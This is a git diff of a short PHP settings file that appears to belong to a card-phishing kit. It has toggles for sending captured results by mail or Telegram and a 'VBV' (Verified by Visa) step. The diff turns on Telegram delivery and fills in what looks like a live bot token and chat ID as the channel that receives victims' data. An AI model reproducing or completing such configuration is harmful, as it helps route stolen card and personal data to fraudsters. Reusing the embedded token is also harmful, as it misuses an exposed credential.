@@ -1,24 +1,19 @@
 <?php
 
-#zerocution
-
 # Mail
-$mail_send = false;                                           # False pour ne pas recevoir par Mail
+$mail_send = false;
 $rezmail = "";
 
-#Telegram
-$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
-$bot_token = "";
-
-$rez_chat = "";                                 # Channel de réception des informations
+# Telegram
+$tlg_send = true;
+$bot_token = "7055576803:AAHnFD3PAcinjw3pRvtHRfXbMy6NyyOeLek";
+$rez_chat = "-4965253584";
 
 # VBV
-
-$vbv = False;
+$vbv = false;
 $timeVBV = "15";
 
 # DEV
-
 $test_mode = true;
 
 ?>
